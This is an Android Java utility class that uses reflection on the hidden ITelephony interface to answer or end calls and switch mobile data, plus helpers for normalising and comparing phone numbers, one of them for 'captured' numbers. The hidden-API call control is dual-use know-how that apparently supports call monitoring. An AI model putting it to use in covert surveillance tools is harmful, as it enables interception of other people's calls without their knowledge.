package com.vvt.telephony;


import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;

import com.vvt.logger.FxLog;

public class TelephonyUtils {

	private static final String TAG = "TelephonyUtils";
	private Context context;

	private void invokeITelephonyMethod(String aMethodName) {

		FxLog.v(TAG, "invokeITelephonyMethod # ENTER ...");
		FxLog.v(TAG, String.format("context = %s", context));

		TelephonyManager aTelephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

		Class<?> aTelephonyManagerClass;
		try {
			aTelephonyManagerClass = Class.forName(aTelephonyManager.getClass()
					.getName());
		} catch (ClassNotFoundException e) {
			FxLog.d(TAG, e.toString());
			return;
		}

		Method aGetItelephonyMethod;
		try {
			aGetItelephonyMethod = aTelephonyManagerClass
					.getDeclaredMethod("getITelephony");
		} catch (SecurityException e) {
			FxLog.d(TAG, e.toString());
			return;
		} catch (NoSuchMethodException e) {
			FxLog.d(TAG, e.toString());
			return;
		}

		aGetItelephonyMethod.setAccessible(true);

		Object aItelephony;

		try {
			aItelephony = aGetItelephonyMethod.invoke(aTelephonyManager);
		} catch (IllegalArgumentException e) {
			FxLog.d(TAG, e.toString());
			return;
		} catch (IllegalAccessException e) {
			FxLog.d(TAG, e.toString());
			return;
		} catch (InvocationTargetException e) {
			FxLog.d(TAG, e.toString());
			return;
		}

		Class<?> aITelephonyClass;
		try {
			aITelephonyClass = Class.forName(aItelephony.getClass().getName());
		} catch (ClassNotFoundException e) {
			FxLog.d(TAG, e.toString());
			return;
		}

		// Invoking
		// -------------------------------------------------------------------------------

		Method aMethod;

		try {
			aMethod = aITelephonyClass.getDeclaredMethod(aMethodName);
		} catch (SecurityException e) {
			FxLog.d(TAG, e.toString());
			return;
		} catch (NoSuchMethodException e) {
			FxLog.d(TAG, e.toString());
			return;
		}

		try {
				FxLog.v(TAG, String.format("Invoking %s...", aMethodName));
			aMethod.invoke(aItelephony);
		} catch (IllegalArgumentException e) {
			FxLog.d(TAG, e.toString());
			return;
		} catch (IllegalAccessException e) {
			FxLog.d(TAG, e.toString());
			return;
		} catch (InvocationTargetException e) {
			FxLog.d(TAG, e.toString());
			return;
		}
	}

	/**
	 * @deprecated You can <code>new</code> this instance directly. The
	 *             constructor is changed to be public.
	 */
	@Deprecated
	public static TelephonyUtils getInstance(Context aContext) {
		return new TelephonyUtils(aContext);
	}

	public TelephonyUtils(Context aContext) {
			FxLog.v(TAG, "TelephonyUtils # ENTER ...");
		context = aContext;
	}

	public void answerIncomingCall() {
		FxLog.v(TAG, "answerIncomingCall # ENTER ...");
		invokeITelephonyMethod("answerRingingCall");
		return;
	}

	public void endCall() {
		FxLog.v(TAG, "endCall # ENTER ...");
		invokeITelephonyMethod("endCall");
	}

	public void enableDataConnectivity() {
		FxLog.v(TAG, "enableDataConnectivity # ENTER ...");
		invokeITelephonyMethod("enableDataConnectivity");

		// Refresh network connection. This can resolve the problem when GPRS
		// connection is
		// sometimes not connected even when the data connectivity is enabled.

		ServiceState aServiceState = new ServiceState();
		aServiceState.setState(ServiceState.STATE_IN_SERVICE);

	}

	public void disableDataConnectivity() {
		FxLog.v(TAG, "disableDataConnectivity # ENTER ...");
		invokeITelephonyMethod("disableDataConnectivity");
	}
	
	public static String formatCapturedPhoneNumber(String number) {
		boolean isEmptyString = number == null || number.trim().length() == 0;
		boolean isParsable = false;
		int parsedInt = 1;
		try {
			parsedInt = Integer.parseInt(number);
			isParsable = true;
		}
		catch (NumberFormatException e) { /* ignore */ }
		
		if (isEmptyString || isParsable && parsedInt < 0) {
			number = "Unknown";
		}
		
		return number;
	}
	
	/**
	 * Make a phone number ready for comparison.
	 * By removing leading characters e.g. +, -, and 0
	 * @param number
	 */
	public static String cleanPhoneNumber(String number) {
		if (number == null) {
			return null;
		}
		
		// Remove digits between parenthesis
		number = removeParenthesisBlock(number);
		
		// Remove symbol + - ( )
		String cleanedNumber = 
			number.replace("+", "").replace("-", "")
				.replace("(", "").replace(")", "").replace(" ", "");
		
		// Remove beginning zero
		if (cleanedNumber.startsWith("0")) {
			Pattern p = Pattern.compile("[0]+");
			Matcher m = p.matcher(cleanedNumber);
			cleanedNumber = m.replaceFirst("");
		}
		
		return cleanedNumber;
	}
	
	public static boolean isSamePhoneNumber(String number1, String number2, int minimumLength) {
    	if (number1 == null || number2 == null) {
			return false;
		}
    	
    	FxLog.v(TAG, String.format(
				"isSamePhoneNumber # number1: %s, number2: %s", number1, number2));
		
		// Clean phone number
		String normalizedNumber1 = cleanPhoneNumber(number1);
		String normalizedNumber2 = cleanPhoneNumber(number2);
		
		FxLog.v(TAG, String.format(
				"isSamePhoneNumber # normalizedNumber1: %s, normalizedNumber2: %s", 
				normalizedNumber1, normalizedNumber2));
		
		if (normalizedNumber1.length() < minimumLength || 
				normalizedNumber2.length() < minimumLength) {
			FxLog.v(TAG, "isSamePhoneNumber # Length of phone numbers are too short - > EXIT ...");
			return false;
		}
		else if (normalizedNumber1.length() > normalizedNumber2.length()) {
			return normalizedNumber1.endsWith(normalizedNumber2);
		}
		else {
			return normalizedNumber2.endsWith(normalizedNumber1);
		}
	}

	/**
	 * For removing the numbers in parenthesis (parenthesis also get deleted)
	 * @param input
	 * @return
	 */
	private static String removeParenthesisBlock(String input) {
		Pattern p = Pattern.compile("([(]+[0-9]*[)]+)*");
		Matcher m = p.matcher(input);
		StringBuffer buffer = new StringBuffer();
		while (m.find()) {
			m.appendReplacement(buffer, "");
		}
		return buffer.toString();
	}

}
